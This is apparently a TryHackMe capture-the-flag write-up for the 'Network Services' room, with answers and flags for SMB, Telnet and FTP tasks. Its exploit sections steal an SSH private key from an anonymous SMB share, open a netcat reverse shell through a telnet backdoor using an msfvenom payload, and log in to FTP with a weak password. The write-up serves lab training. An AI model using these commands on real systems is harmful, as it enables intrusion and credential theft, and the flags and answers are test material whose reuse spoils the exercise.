# Network Services

<Image src="https://tryhackme-images.s3.amazonaws.com/room-icons/623103b06d1d53c3d8bddfc16998f9d7.png" width="128" />

## Task 1 - Get Connected

> Ready? Let's get going!

No answer needed

## Task 2 - Understanding SMB

> What does SMB stand for?

Server Message Block

> What type of protocol is SMB?

response-request

> What do clients connect to servers using?

TCP/IP

> What systems does Samba run on?

Unix

## Task 3 - Enumerating SMB

> Conduct an nmap scan of your choosing, How many ports are open?

3

> What ports is SMB running on?

139/445

> Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?

WORKGROUP

Run:

```bash
 enum4linux -a <IP>
 enum4linux -a 10.10.10.1
```

<Image src="/images/writeups/thm/network/smb-workspace.png" />

> What comes up as the name of the machine?

POLOSMB

> What operating system version is running?

6.1

<Image src="/images/writeups/thm/network/smb-os.png" />

> What share sticks out as something we might want to investigate?

profiles

<Image src="/images/writeups/thm/network/smb-shares.png" />

## Task 4 - Exploiting SMB

> What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

smbclient //10.10.10.2/secret -U suit

> Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.

No answer needed

> Does the share allow anonymous access? Y/N?

Y

Run this command and press enter when it asks for a password:

```bash
smbclient //10.10.147.248/profiles -U Anonymous
```

> Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

John Cactus

```bash
smbclient //10.10.147.248/profiles -U Anonymous
get 'Working From Home Information.txt'
exi
cat 'Working From Home Information.txt'
```

<Image src="/images/writeups/thm/network/smb-document.png" />

> What service has been configured to allow him to work from home?

ssh

> Okay! Now we know this, what directory on the share should we look in?

.ssh

> This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

id_rsa

> What is the smb.txt flag?

THM{smb_is_fun_eh?}

To enter the ssh server, run this commands:

```bash
# move to root directory
cd

# connect to smb folder and get the key for ssh
smbclient //10.10.147.248/profiles -U Anonymous
get .ssh/id_rsa
exit

# add key to ssh
chmod 600 .ssh/id_rsa
ssh-add

# connect to ssh
ssh cactus@10.10.147.248
cat smb.txt
```

## Task 5 - Understanding Telnet

> What is Telnet?

Application Protocol

> What has slowly replaced Telnet?

SSH

> How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

telnet 10.10.10.3 23

> The lack of what, means that all Telnet communication is in plaintext?

Encryption

## Task 6 - Enumerating Telnet

> How many ports are open on the target machine?

1

```bash
nmap -sS <IP> -p- -vv
```

> What port is this?

8012

> This port is unassigned, but still lists the protocol it's using, what protocol is this?

TCP

> Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

0

> It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.

No answer needed

> Based on the title returned to us, what do we think this port could be used for?

a backdoor

> Who could it belong to? Gathering possible usernames is an important step in enumeration.

skidy

```bash
telnet <IP> 8012
```

> Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.

No answer needed

## Task 7 - Exploiting Telnet

> Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.

No answer needed

> Great! It's an open telnet connection! What welcome message do we receive?

SKIDY'S BACKDOOR.

```bash
telnet <HOST> 8012
```

> Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

N

> Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.

No answer needed

> This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

No answer needed

> Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

N

```bash
.RUN ping <HOST> -c 1
```

> Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!

No answer needed

> What word does the generated payload start with?

mkfifo

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=<HOST> lport=4444 R
```

> What would the command look like for the listening port we selected in our payload?

nc -lvp 4444

> Hopefully- this will give us a shell on the target machine!

No answer needed

> Success! What is the contents of flag.txt?

THM{y0u_g0t_th3_t3ln3t_fl4g}

```bash
.RUN mkfifo /tmp/zuetelk; nc <HOST> 4444 0</tmp/zuetelk | /bin/sh >/tmp/zuetelk 2>&1; rm /tmp/zuetelk
```

## Task 8 Understanding FTP

> What communications model does FTP use?

Client-server

> What's the standard FTP port?

21

> How many modes of FTP connection are there?

2

Active and passive

## Task 9 - Enumerating FTP

> How many ports are open on the target machine?

2

21 and

```bash
nmap -sS 10.10.51.196 -p-
```

> What port is ftp running on?

21

> What variant of FTP is running on it?

vsftpd

```bash
nmap -A -p 21 <HOST> -vv
```

> What is the name of the file in the anonymous FTP directory?

PUBLIC_NOTICE.txt

> What do we think a possible username could be?

mike

> Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...

No answer needed

## Task 10 - Exploiting FTP

> What is the password for the user "mike"?ù

password

> Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted

No answer needed

> What is ftp.txt?

THM{y0u_g0t_th3_ftp_fl4g}

## Task 11 - Expanding Your Knowledge

> Well done, you did it!

No answer needed
